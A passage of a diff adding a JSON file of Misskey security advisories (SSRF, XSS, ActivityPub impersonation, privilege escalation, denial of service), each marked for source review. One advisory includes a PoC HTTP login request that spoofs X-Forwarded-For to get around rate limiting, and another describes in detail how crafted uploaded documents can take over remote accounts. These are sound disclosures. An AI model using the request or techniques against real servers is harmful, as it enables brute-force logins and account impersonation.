+      "body": "Summary\n\nMissing validation in ApRequestService.signedGet and HttpRequestService.getActivityJson allows an attacker to create fake user profiles and forged notes. The spoofed users will appear to be from a different instance than the one where they actually exist, and the forged notes will appear to be posted by a different user.\n\nImpact\n\nVulnerable Misskey instances will accept the spoofed objects as valid, allowing an attacker to impersonate other users and instances. The attacker retains full control of the spoofed user / note and can interact like a real account.",
+      "url": "https://github.com/misskey-dev/misskey/security/advisories/GHSA-m2gq-69fp-6hv4",
+      "status": "requires-source-review"
+    },
+    {
+      "id": "GHSA-m9xp-2fvm-pfmq",
+      "title": "Denial of service resulting from insufficient cleanup processing during file uploads",
+      "body": "Summary\n\nAll Misskey servers running versions 13.0.0 and later, but prior to 2026.7.0 (excluding 2025.4.1), have a vulnerability where cleanup processing may not be executed during file uploads. This can lead to storage and/or file descriptor exhaustion and potential denial of service condition. This vulnerability occurs regardless of whether federation is enabled or not.\n\nWorkaround\n\nThere is no known workaround.",
+      "url": "https://github.com/misskey-dev/misskey/security/advisories/GHSA-m9xp-2fvm-pfmq",
+      "status": "requires-source-review"
+    },
+    {
+      "id": "GHSA-mqv7-gxh4-r5vf",
+      "title": "Server-Side Request Forgery vulnerability in download",
+      "body": "Impact\n\nURLからアップロード及びリモート添付ファイルの処理にServer-Side Request Forgeryの脆弱性が存在します。\nこれにより、内部ネットワーク内の非公開の情報が漏洩する可能性があります。\n\nA Server-Side Request Forgery vulnerability exists in \"Upload from URL\" and remote attachment handling.\nThis could result in the exposure of non-public information within the internal network.\n\nPatches\n\n12.90.0 で修正されています。\nただし、Proxyを使用している場合は別途対策する必要があります。\n\nThis has been fixed in 12.90.0.\nHowever, if you are using a proxy, you will need to take additional measures.\n\nWorkarounds\n\nアプリケーションが実行されているホストからプライベートネットワーク等へのアクセスを、適切に制限することにより回避できる可能性があります。\n\nThis may be avoided by appropriately restricting access to private networks from the host where the application is running.\n\nReferences\n\n\nCHANGELOG\n\nFix commit: https://github.com/misskey-dev/misskey/commit/e1a8b158e04ad567d92d8daf3cc0898ee18f1a2e e1a8b15\n\n\nFor more information\n\nIf you have any questions or comments about this advisory:\n\n\nOpen an issue in https://github.com/misskey-dev/misskey/issues\n\nEmail us at syuilotan@yahoo.co.jp",
+      "url": "https://github.com/misskey-dev/misskey/security/advisories/GHSA-mqv7-gxh4-r5vf",
+      "status": "requires-source-review"
+    },
+    {
+      "id": "GHSA-p73x-6qrq-34jc",
+      "title": "Cross-site scripting in RSS feed item links",
+      "body": "Summary\n\nAll Misskey servers running versions 12.0.0 and later, but prior to 2026.7.0, contain a Cross-Site Scripting (XSS) vulnerability in the RSS components due to missing URL scheme verification.\n\nWorkaround\n\nThere is no known workaround. Users are advised to take measures such as refraining from clicking links within RSS widgets and reviewing RSS source URLs to ensure content is loaded only from the sites you trust.",
+      "url": "https://github.com/misskey-dev/misskey/security/advisories/GHSA-p73x-6qrq-34jc",
+      "status": "requires-source-review"
+    },
+    {
+      "id": "GHSA-pfp5-r48x-fg25",
+      "title": "XSS of ActivityPub URI",
+      "body": "Impact\n\nActivityPubを通して受け取ったユーザーやノートを表示する際に表示される送信元へインスタンスへのリンクが適切に検証されていないため、javascriptスキームを持つURLを挿入することで、クリックした際に任意のJavaScriptを実行するリンクを挿入ことができます。\n\nThe link to the instance to the sender that appears when viewing a user or note received through ActivityPub is not properly validated, so by inserting a URL with a javascript scheme, a link that executes any JavaScript when clicked can be You can insert a link that executes any JavaScript when clicked by inserting a URL with a javascript scheme.\n\nPatches\n\n13.5.0で修正されています。\n\nThis has been fixed in 13.5.0.\n\nWorkarounds\n\n信頼できないインスタンスの「リモートで表示」を行わない。\n\nDo not \"view on remote\" untrusted instances.",
+      "url": "https://github.com/misskey-dev/misskey/security/advisories/GHSA-pfp5-r48x-fg25",
+      "status": "requires-source-review"
+    },
+    {
+      "id": "GHSA-pj3p-xfwj-rwxv",
+      "title": "Moderators can take over administrator account (privilege elevation)",
+      "body": "Summary\n\nAll Misskey servers running versions 13.0.0 and later, but prior to 2026.7.0, have a vulnerability where a malicious (or compromised) moderator can change the password of a non-root user with administrator privileges. This could lock the user out of their account, preventing them from logging in, and potentially allow the account to be taken over (i.e., privilege escalation).\n\nThere are workarounds available except for pre-release versions of 2026.7.0.\n\nWorkarounds\n\n\nTemporarily revoke the moderator privileges for any users you do not fully trust. For other moderators as well, review their recent activity, and just to be safe, revoke their moderator privileges if they have been inactive for a while or cannot be reached.\n\nSet up two-factor authentication for users with administrator privileges. While you cannot prevent that user from being locked out of an administrator account unless you are using the root account, you can prevent privilege escalation.\n\nIf you are using the 2026.7.0 pre-release (any alpha/beta) version, you cannot use this workaround due to a flaw in resetting MFA. Please update to 2026.7.0.",
+      "url": "https://github.com/misskey-dev/misskey/security/advisories/GHSA-pj3p-xfwj-rwxv",
+      "status": "requires-source-review"
+    },
+    {
+      "id": "GHSA-pmmv-jwqh-f5ww",
+      "title": "XSS vulnerability using dialog",
+      "body": "Impact\n\nMisskey Webクライアント組み込みのダイアログを使用し、悪意のある文字列を表示させることでXSSが成立します。\nXSSが行われることで、APIリクエスト用のトークンが奪取される危険性があります。\nMisskey バージョン 12.51.0 未満を使用するすべてのユーザーが影響を受けます。\n\nXSS is established by using the Misskey web client built-in dialog to display a malicious string.\nThere is a risk that the token for the API request will be taken by XSS.\nAll users using Misskey versions less than 12.51.0 are affected.\n\nPatches\n\n12.51.0で修正されています。\n\nThis has been fixed in 12.51.0.\n\nWorkarounds\n\n有効な回避策はありません。アップデートをお願いします。\n\nThere is no effective workaround. Please update.\n\nReferences\n\nFix commit\nhttps://github.com/misskey-dev/misskey/commit/ec203f7f795766f76b55fecc9248168c1cdf6c99 ec203f7\n\nFor more information\n\nIf you have any questions or comments about this advisory:\n\n\nOpen an issue in https://github.com/misskey-dev/misskey/issues\n\nEmail us at syuilotan@yahoo.co.jp",
+      "url": "https://github.com/misskey-dev/misskey/security/advisories/GHSA-pmmv-jwqh-f5ww",
+      "status": "requires-source-review"
+    },
+    {
+      "id": "GHSA-qqrm-9grj-6v32",
+      "title": "Lack of media type verification of Activity Streams objects allows impersonation and takeover of remote accounts",
+      "body": "Summary\n\nWhen fetching remote Activity Streams objects, Misskey doesn't check that the response from the remote server has a Content-Type header value of the Activity Streams media type, which allows a threat actor to upload a crafted Activity Streams document to a remote server and make a Misskey instance fetch it, if the remote server accepts arbitrary user uploads.\n\nDetails\n\nApResolverService.prototype.resolve doesn't check that the response from the remote server has a Content-Type header value of the Activity Streams media type (i.e. application/ld+json with a profile value of https://www.w3.org/ns/activitystreams, or application/activity+json). This implies that a Misskey instance can fetch a user-uploaded document on a remote server (including a document on Drive of another Misskey instance) and accept it as an Activity Streams object unless it's otherwise malformed.\n\nThe ap/show API endpoint refetches the id of the top-level node of the fetched JSON-LD document when it doesn't match the original request URL, which should have increased complexity of the exploit as the threat actor would need an ability to predict the URI of the uploaded documents before uploading them or to edit the uploaded documents without changing the URI. Misskey itself uses UUIDs in the URIs of uploaded documents, so it should have been hard to impersonate accounts on a Misskey instance via ap/show.\n\nHowever, that check is not performed by ApNoteService.prototype.createNote, so it can be bypassed by creating an intermediary Note object that references the URL of the uploaded document and make a Misskey instance fetch the intermediary object.\n\nThe vulnerability can be exploited in the following ways:\n\nSpoofing the attributedTo property for impersonation\nA threat actor can impersonate a remote account by uploading documents with a crafted attributedTo property which equals the Activity Streams actor URI of the victim account.\n\nCreating fake accounts and takeover of remote accounts\nAn threat actor can create fake (pseudo) accounts by uploading crafted actor objects to a remote server.\n\nThe id of the fake actor can be the URI of another legitimate actor on the remote server, if the Misskey instance hasn't fetched that actor before. So the exploit enables a takeover of the inbox of an existing remote account and interception of activities (including private ones) local users send to the remote account.\n\nImpact\n\nThe vulnerability allows a threat actor to impersonate and take over an account on a remote server that satisfies all of the following properties:\n\n\nAllows the threat actor to register an account\n\nAccepts arbitrary user-uploaded documents and places them on the same domain as legitimate Activity Streams actors\n\nServes user-uploaded document in response to requests with an Accept header value of the Activity Streams media type\n\n\nThe vulnerability may also affect accounts on server implementations that don't normally serve arbitrary user-uploaded documents, in combination with a vulnerability of the other implementation like GHSA-9928-3cp5-93fm which can make the server serve arbitrary document.\n\nTimeline\n\n\n\n\nDate and time\nEvent\n\n\n\n\n2020-07-15T06:02:24Z\nA same kind of issue was reported to Pleroma: https://git.pleroma.social/pleroma/pleroma/-/issues/1948#note_67278\n\n\n2023-09\nIndependently from Pleroma's issue, the reporter (@tesaguri) discovered the same kind of issue in Kitsune, an alpha-stage server implementation, and they reported it to the author of the implementation via GitHub's security advisory feature. At this time, the reporter was only regarding the issue as a phishing vector (creating fake actors on hosting services like GitHub, rather than on ActivityPub servers) and wasn't expecting that it can be exploited for impersonation and takeover of existing actors in practice.\n\n\n2023-10-28T15:59:49Z\nA security advisory on the vulnerability in Kitsune was published: GHSA-xmw2-875x-rq88.\n\n\n2024-02-07+0900\nThe reporter filed this report with Misskey Project.\n\n\n\nThe important point is that same kind of issues have been publicly revealed at least twice, and that anyone familiar with implementations like Misskey may have conceived the exploit more easily. It's strongly advised to update existing deployments to the patched version as soon as possible.",
+      "url": "https://github.com/misskey-dev/misskey/security/advisories/GHSA-qqrm-9grj-6v32",
+      "status": "requires-source-review"
+    },
+    {
+      "id": "GHSA-r33c-qg3g-v9cr",
+      "title": "Lack of proper authorization checks and input validation",
+      "body": "Summary\n\nAll Misskey servers running versions 8.45.0 and later, but prior to 2026.3.1, contain a vulnerability that allows bad actors access to data that they ordinarily wouldn't be able to access due to insufficient permission checks and proper input validation. This vulnerability occurs regardless of whether federation is enabled or not. This vulnerability could lead to a significant data breach.\n\nWorkaround\n\nThere is no known workaround for this vunerability. Please update to the latest version of Misskey immediately.\n\nNotes\n\nWe are intentionally limiting information at this time to protect servers that does not patched yet. Please update to the latest version of Misskey as soon as possible.\n\nCVE-2026-28431 consists of the following multiple security advisories. When publishing to the CVE list, it is recommended to use the one with the highest severity score, which is CVSS v4 9.2, as the basis.\n\n\nLack of proper authorization checks and input validation (CVSS v4 9.2) This advisory\nGHSA-r33c-qg3g-v9cr\n\nLack of proper authorization checks (CVSS v4 6.9)\nGHSA-cvf3-p7p2-27fh\n\nLack of proper permission checks (CVSS v4 6.0)\nGHSA-gg7j-c76w-8x3g\n\n\n\n概要\n\nバージョン 8.45.0 以降、かつ 2026.3.1 以前のMisskeyサーバーには、権限の確認と入力データの検証が不十分なため、悪意のある攻撃者が通常アクセスできないデータにアクセスできる脆弱性が存在します。この脆弱性は、Misskeyの連合機能が有効になっているかどうかに関わらず発生します。この脆弱性は深刻なデータ漏洩につながる、重大なものとなります。\n\n回避策\n\nこの問題に対する回避策は今のところ見つかっていません。\nこの脆弱性は致命的なものです。至急、最新バージョンのMisskeyにアップデートしてください。\n\n備考\n\n現時点では、まだパッチを適用していないサーバーを保護するため、詳細を省略して発表しています。まだアップデートしていないサーバーは、至急最新バージョンのMisskeyにアップデートしてください。\n\nCVE-2026-28431 は、以下の複数のセキュリティ アドバイザリによって構成されています。すべて v2026.3.1 で修正されています。\n\n\nLack of proper authorization checks and input validation (CVSS v4 9.2) 本件\nGHSA-r33c-qg3g-v9cr\n\nLack of proper authorization checks (CVSS v4 6.9)\nGHSA-cvf3-p7p2-27fh\n\nLack of proper permission checks (CVSS v4 6.0)\nGHSA-gg7j-c76w-8x3g",
+      "url": "https://github.com/misskey-dev/misskey/security/advisories/GHSA-r33c-qg3g-v9cr",
+      "status": "requires-source-review"
+    },
+    {
+      "id": "GHSA-rrm8-pwmf-gxm3",
+      "title": "Unexpected crashes, and potential other vulnerabilities via heap overflow due to a vulnerability in libheif (dependency)",
+      "body": "Summary\n\nAll Misskey servers running versions 2026.7.0 contain a heap overflow vulnerability caused by a flaw in libheif, a dependency of the sharp library. This vulnerability could cause the Misskey instance to crash and, potentially lead to arbitrary code execution, when provided malformed data. While arbitrary code execution has not yet been demonstrated on Misskey, there have been reports of successful exploitation of other downstream software affected by this vulnerability.\n\nReferences\n\nGHSA-g89c-p67h-r497\n\nGHSA-rgj7-g3m4-5g8c\n\n\nWorkarounds\n\nThere is no workaround for this issue.\n\nRemediation\n\nPlease update Misskey to the latest version as soon as you can. If you are currently using a version prior to 2026.7.0, do not update to 2026.7.0; instead, update directly to 2026.9.0 or later, ideally the latest version.\n\nAs a precaution, if libheif is installed directly on the system where Misskey runs, please ensure that it is also updated.\n\n\n概要\n\nMisskey 2026.7.0 を実行している全てのサーバーでは、Misskey バックエンドの依存関係の一つである sharp が依存している libheif の問題によるヒープオーバーフローの脆弱性があります。これにより、不正な形式のファイルが Misskey に入力されると、Misskey が意図せず停止したり、最悪の場合任意コード実行につながったりする可能性があります。なお、この脆弱性により Misskey で任意コード実行が可能かどうかについてはまだ実証できていませんが、この脆弱性の影響を受ける複数の他のソフトウェアでは任意コード実行が可能であると報告されています。\n\n参考\n\nGHSA-g89c-p67h-r497\n\nGHSA-rgj7-g3m4-5g8c\n\n\n回避策\n\nこの問題に対する回避策は見つかっていません。\n\n修正について\n\nできるだけ早く最新バージョンの Misskey にアップデートしてください。もし現時点で 2026.7.0 より前の Misskey を使用している場合は、2026.7.0 にはアップデートせず、2026.9.0 以降（できれば最新バージョン）に直接アップデートしてください。\n\nまた、もし Misskey を実行している環境上に直接 libheif がインストールされている場合は、念のためそちらもアップデートしてください。",
+      "url": "https://github.com/misskey-dev/misskey/security/advisories/GHSA-rrm8-pwmf-gxm3",
+      "status": "requires-source-review"
+    },
+    {
+      "id": "GHSA-vc39-c453-67g3",
+      "title": "XSS vulnerability using url preview",
+      "body": "Impact\n\nURLプレビュー機能において、URLの検証が不十分なため、悪意のあるURLをプレビュー時に「プレイヤーで表示」もしくは「ウィンドウで表示」を行った場合に任意のJavaScriptが実行されます。\n\nIn the URL preview function, due to insufficient URL validation, arbitrary JavaScript is executed when a malicious URL is \"View in Player\" or \"View in Window\" during preview.\n\nPatches\n\n13.3.2で修正されています。\n\nThis has been fixed in 13.3.2.\n\nWorkarounds\n\n当該機能を使用しない。\n\nDo not use the said function.",
+      "url": "https://github.com/misskey-dev/misskey/security/advisories/GHSA-vc39-c453-67g3",
+      "status": "requires-source-review"
+    },
+    {
+      "id": "GHSA-vwfw-pgg7-5hg6",
+      "title": "Lack of proper authorization checks",
+      "body": "Summary\n\nAll Misskey servers running versions prior to 2026.9.0 contains a vulnerability that allows bad actors to obtain limited portions of data about which other users a given user has interacted with, and how much, due to a lack of proper permission checks. This information includes interactions that took place only through notes with restricted visibility. The contents of those notes are not exposed, and notes themselves remain readable only to their intended audience. This vulnerability occurs regardless of whether federation is enabled or not.\n\nWorkaround\n\nAdministrators can temporarily mitigate this issue by blocking access to the /api/users/get-frequently-replied-users endpoint at the reverse proxy level (e.g., Nginx, Cloudflare). Otherwise, there is no known built-in workaround.\n\n\nThe CVE ID is currently being requested. It will be updated once confirmed.",
+      "url": "https://github.com/misskey-dev/misskey/security/advisories/GHSA-vwfw-pgg7-5hg6",
+      "status": "requires-source-review"
+    },
+    {
+      "id": "GHSA-w8x2-gpq6-jxvf",
+      "title": " JSON-LD signature validation + compaction may lead to improper activity handling",
+      "body": "Summary\n\nAll Misskey servers running versions 12.37.0 and later, but prior to 2026.5.4, contain a vulnerability in JSON-LD signature validation and compaction process that allows spoofed activities to be accepted as valid.\n\nWorkaround\n\nThere is no known workaround. Please update to the latest Misskey immediately.\n\nAcknowledgement\n\nThis vulnerability was first discovered on Mastodon, and found out that it affects major ActivityPub-compatible software. Original finders are:\n\n\nDoyensec in collaboration with Claude and Anthropic Research\n\nhttps://github.com/tesaguri\n\nhttps://github.com/ClearlyClaire",
+      "url": "https://github.com/misskey-dev/misskey/security/advisories/GHSA-w8x2-gpq6-jxvf",
+      "status": "requires-source-review"
+    },
+    {
+      "id": "GHSA-w98m-j6hq-cwjm",
+      "title": "Token remains valid in cookie after signing out",
+      "body": "Summary\n\nBull Dashboardの認証のためにCookieに token という名前でlogin tokenが保存されますが、ログアウトを実行してもこれが削除されずに残る脆弱性があります。\n\nA login token named token is stored in a cookie for authentication purposes in Bull Dashboard, but this remains undeleted even after logout is performed.\n\nImpact\n\n主に公共PCや他人のデバイスを利用してMisskeyにログインしたことのあるユーザーが対象になると考えられますが、自分のPCを他人に貸す前にMisskeyをログアウトしたユーザーなどもこの脆弱性の影響を受ける可能性があります。\n\nThe primary targets will be users who have logged into Misskey using a public PC or someone else's device, but it's possible that users who have logged out of Misskey before lending their PC to someone else could also be targeted.\n\nAcknowledgment\n\nこの脆弱性は @yoshikouki によって発見された後、@Hoto-Cocoa によってアドバイザリとして報告され、修正に至りました。\n\nThis vulnerability was first discovered by @yoshikouki, compiled into an advisory by @Hoto-Cocoa, and patched.",
+      "url": "https://github.com/misskey-dev/misskey/security/advisories/GHSA-w98m-j6hq-cwjm",
+      "status": "requires-source-review"
+    },
+    {
+      "id": "GHSA-wmhf-m93m-rgmj",
+      "title": "Denial of Service via Uncontrolled Recursion in Theme Compilation",
+      "body": "Summary\n\nAll Misskey servers running versions 8.63.0 and later, but prior to 2026.5.4, contain a vulnerability that can cause the Misskey web client to slow down or crash when it applies a malformed theme.\n\nWorkaround\n\n\nUse trusted theme or pre-installed theme.\n\nManually check the theme code for any recursive property references before applying.\n\n\nAcknowledgement\n\nThis vulnerability was discovered by https://takumi-san.ai/ and compiled into an advisory by Misskey Project.",
+      "url": "https://github.com/misskey-dev/misskey/security/advisories/GHSA-wmhf-m93m-rgmj",
+      "status": "requires-source-review"
+    },
+    {
+      "id": "GHSA-wwrj-3hvj-prpm",
+      "title": "Login rate limit bypass via spoofed X-Forwarded-For header.",
+      "body": "Summary\n\nWhen using an untrusted reverse proxy or not using a reverse proxy at all, attackers can bypass IP rate limiting by adding a forged X-Forwarded-For header. Starting with version 2025.9.1, an option (trustProxy) has been added in config file to prevent this from happening. However, it is initialized with an insecure default value before version 2025.12.0, making it still vulnerable if the configuration is not set correctly.\n\nWorkaround\n\nIf you are running Misskey with a trusted reverse proxy, you should not be affected by this vulnerability.\n\n\nThere is no workaround for the Misskey itself. Please update Misskey to the latest version or set up a trusted reverse proxy.\n\nFrom v2025.9.1 to v2025.11.1, workaround is available. Set trustProxy: false in config file.\n\nThis is patched in v2025.12.0 by flipping default value of trustProxy to false. If you are using trusted reverse proxy and not remember you manually overrided this value, please take time to check your config for optimal behavior.\n\n\nDetails\n\nFastify recommend not trusting X-Forwarded-For IPs\nDue to misconfiguration in https://github.com/misskey-dev/misskey/blob/develop/packages/backend/src/server/api/SigninApiService.ts#L94 attacks can spoof their IPs.\n\nPoC\n\nPOST /api/signin-flow HTTP/1.1\nHost: misskey.localhost:3123\nContent-Length: 45\nContent-Type: application/json\nConnection: keep-alive\nX-Forwarded-For: 127.1.1.31, 1.1.1.12\n\n{\"username\":\"admin\",\n\t\"password\":\"password\"}\n\n\n\n\nImpact\n\nAn attacker can brute force accounts bypassing rate limiting protection",
+      "url": "https://github.com/misskey-dev/misskey/security/advisories/GHSA-wwrj-3hvj-prpm",
+      "status": "requires-source-review"
+    },
+    {
+      "id": "GHSA-xc6c-m4f7-jcc9",
+      "title": "Unsanitized user-input values are injected into HTML notification emails",
+      "body": "Summary\n\nAll Misskey servers running versions 12.70.0 and later, but prior to 12.108.0, was vulnerable to HTML injection in email notifications, allowing bad actors to place arbitrary markup into notification messages delivered to local users. The injected content is under the control of a remote actor on a federated server, so no local account or prior interaction with the victim is required. This vulnerability only affects servers configured email integrations, and only users who have email notifications enabled.\n\nWorkaround\n\nDisabling email integration on the server, or having users turn off email notifications, prevents the affected messages from being sent.\n\n\nImportant Note: Although this vulnerability ceased to occur in subsequent versions because the email notification feature itself was disabled in version 12.108.0, we have applied a fix to the commented-out code to prevent the same issue from arising should the feature be re-added in the future. Please note, however, that we do not plan to backport this fix to the affected versions, as they are old and not supported. If you are using customized version of Misskey and it has been re-enabled these email notifications, you may be affected to this vulnerability.\n\nThe CVE ID is currently being requested. It will be updated once confirmed.",
+      "url": "https://github.com/misskey-dev/misskey/security/advisories/GHSA-xc6c-m4f7-jcc9",
+      "status": "requires-source-review"
+    }
+  ]
+}
